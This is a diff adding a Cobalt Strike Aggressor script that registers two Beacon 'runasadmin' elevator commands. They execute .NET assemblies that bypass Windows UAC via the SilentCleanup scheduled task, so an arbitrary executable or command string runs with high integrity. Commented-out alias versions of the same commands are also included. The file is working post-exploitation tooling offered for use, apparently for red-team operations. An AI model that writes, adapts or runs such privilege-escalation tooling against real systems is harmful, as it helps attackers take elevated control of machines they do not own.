@@ -1,0 +1,41 @@
+### Comment out the section of lines below to add these commands as an alias within CS, rather than within the 'runasadmin' section
+
+#alias("uac-silentcleanup-exe", {
+#	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passexe.exe"), $2);
+#});
+
+#beacon_command_register(
+#	"uac-silentcleanup-exe",
+#	"Run the silentcleanup UAC bypass to execute an arbitrary EXE",
+#	"Example: uac-silentcleanup [full path to executable to run in high-integrity]");
+
+#alias("uac-silentcleanup-command", {
+#	# Enclose the args in double quotes
+#	$newargs = '"' . $2 . '"';
+#	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passcommand.exe"), $newargs);
+#});
+
+#beacon_command_register(
+        #"uac-silentcleanup-command",
+        #"Run the silentcleanup UAC bypass to execute an abritrary command string",
+        #"Example: uac-silentcleanup-command [command string enclosed in DOUBLE quotes]");
+
+
+
+### Adds 2 new options under the "runasadmin" command, uac-silentcleanup-exe and uac-silentcleanup-command.
+
+sub silentcleanup_exe {
+	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passexe.exe"), $2);
+}
+
+beacon_elevator_register("uac-silentcleanup-exe", "Bypass UAC with silentcleanup schtask - arg should be full path to exe", &silentcleanup_exe);
+
+
+
+sub silentcleanup_command {
+	# Enclose the args in double quotes
+	$newargs = '"' . $2 . '"';
+	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passcommand.exe"), $newargs);
+}
+
+beacon_elevator_register("uac-silentcleanup-command", "Bypass UAC with silentcleanup schtask - args should be command string without surrounding quotes, use single quotes within command as needed", &silentcleanup_command);
